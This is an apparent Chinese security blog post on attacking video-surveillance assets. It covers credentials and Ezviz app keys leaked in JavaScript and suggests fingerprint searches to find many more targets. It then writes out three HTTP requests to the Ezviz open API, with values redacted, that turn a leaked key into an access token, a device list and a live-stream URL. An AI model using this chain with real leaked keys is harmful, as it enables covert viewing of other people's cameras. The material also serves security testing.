---
title: 攻防实战 | 视频监控类资产专项攻击1
url: https://mp.weixin.qq.com/s/TO_Wdv85Ugr0fRJHHIx5KQ
source: Doonsec's feed
date: 2026-05-08
fetch_date: 2026-05-09T05:05:03.428587
---

# 攻防实战 | 视频监控类资产专项攻击1

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/6mEJuibtxKvNmxc70nkhOrunuLWhQRick5pZmP15ic2OTR6h2DK1TsW3tGlPsB78TAR2iaq1I4Gx1pRJ2picQZSA4cE6NeZ2Mk4mgicHURkjUNQaI/0?wx_fmt=jpeg)

# 攻防实战 | 视频监控类资产专项攻击1

原创

安全艺术
安全艺术

安全艺术

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

# 1. js泄露账号密码

老生常谈了，碰到了就是纯运气了，如果还没有重复就可以试试买彩票了。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/6mEJuibtxKvP67wicqlPzoonaqCwA9aEKibwvqvOtIXcEIdVMgBLCJLtxIM9kC2bonzZH4662l0BHpSreQdaxvRzibbqaBicnCdu5fm5L7QMdtLo/640?wx_fmt=png&from=appmsg)

稍微发散下，拿图标等指纹信息批量搜一下，也许会打到一大波，哈哈哈哈。

# 2. js泄露secret

还是看运气。

![](https://mmbiz.qpic.cn/mmbiz_png/6mEJuibtxKvN8IwSbuMmXXpOicWlY7kHbsicosYgiaQNILqk6ZpNEuBdtywhibaOZdQ00f8rIMdYDDiabbrNGWQiafoGNeUjnwe7iaKeicDiaz5cUHtDo/640?wx_fmt=png&from=appmsg)

萤石的key第一次碰到，查了资料说是可以直接看监控，打了一波，记录下。

获取accessToken

```
POST /api/lapp/token/get HTTP/1.1
Host: open.ys7.com
Accept: application/json
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 82

appKey=xxx&appSecret=xxx
```

![](https://mmbiz.qpic.cn/mmbiz_png/6mEJuibtxKvPMaXmDK1a1DHOxbgXkLXExDfxheCoV20ZXFw2qMRL0jH2vgKTFibac1RicrZ3vv3pryVjHhlXcb5toNdIicTeibeA1duwdxnlMPrk/640?wx_fmt=png&from=appmsg)

获取deviceSerial

```
POST /api/lapp/device/list HTTP/1.1
Host: open.ys7.com
Accept: application/json
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 101

accessToken=xxxxxx&pageStart=1&pageSize=10
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/6mEJuibtxKvMTD6BcRgByB0vvicCRmxpj2pr4KiaaPpl6GIkYbMicEVa2e5RFZeF72FtGFkHicuCDU52dOpYwibs7q4hlOg6fcgODibpF8sDGRSvjU/640?wx_fmt=png&from=appmsg)

获取url

```
POST /api/lapp/v2/live/address/get HTTP/1.1
Host: open.ys7.com
Accept: application/json
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 99

accessToken=xxxxx&deviceSerial=xxxxx
```

![](https://mmbiz.qpic.cn/mmbiz_png/6mEJuibtxKvM7uhjyyicGEaNzzv0Fod8IER7hPj3PLA1nsTjUF2CT4Y15Ca8f55ceicAYfXbetVyicNFNN4nOAqQiaLa6Lxyk5RSzVGWHZ9ok2HE/640?wx_fmt=png&from=appmsg)

直接拼接访问

https://open.ys7.com/ezopen/h5/iframe\_se?url=xxxx&autoplay=1&accessToken=xxxx

![](https://mmbiz.qpic.cn/sz_mmbiz_png/6mEJuibtxKvMTnDwHUgTJwoVl9ibM3R6Q47HwjzQVnfwaibFK93t7ia6sy6F12Ziaueea7ADChmF3kSygTU1SexkHR8HtSlZr6PzsIVo1I8TAIVI/640?wx_fmt=png&from=appmsg)

最后推一下我的实战小圈子

![](https://mmbiz.qpic.cn/sz_mmbiz_png/6mEJuibtxKvPiaaO68abRKdkpvn7ArjPFRDvB98X2icoXibcza1ItM7d8zVoPmgiavafoiabRQ7ZI8kGoheibFI1UvNUZT326xEYW7W3ymREIFls60/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/6mEJuibtxKvNYMOm88Cwib2M8xIyXdw1b48ZicyBL6icNFBnt3hqC3ExkmDWr3zHSAvGibIKpnNFxpsHYW0eBnjJ1sKJD2T1Pn6ODGD5lqqJhvzY/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/6mEJuibtxKvPj6jwEeFFq3gshiaghkyGJia4z52ia8oTib0971pyqu7cVM7EicuOgdxOIGbvHXEAR3LXyW45ssYbPVXFjvT3cicqzs8LUs6OLmsknw/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/6mEJuibtxKvM3yoBcxO4vyhhuynb3ibpnVeIrJIX6IZmbDMib0CfibwwfaAJvPZLvLV22ZzlRwcC2f2icY2rWFJfnE7XIkKwicQTGHt5Uumbko4Fw/640?wx_fmt=png&from=appmsg)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2Oo4NY9fLLoomQgld6ia6hfpRbrvGyVibgUgzOauMBthcywVUOU2bSRtSyjunLPVQNqRAO2YKH85bPMg/0?wx_fmt=png)

安全艺术

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2Oo4NY9fLLoomQgld6ia6hfpRbrvGyVibgUgzOauMBthcywVUOU2bSRtSyjunLPVQNqRAO2YKH85bPMg/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过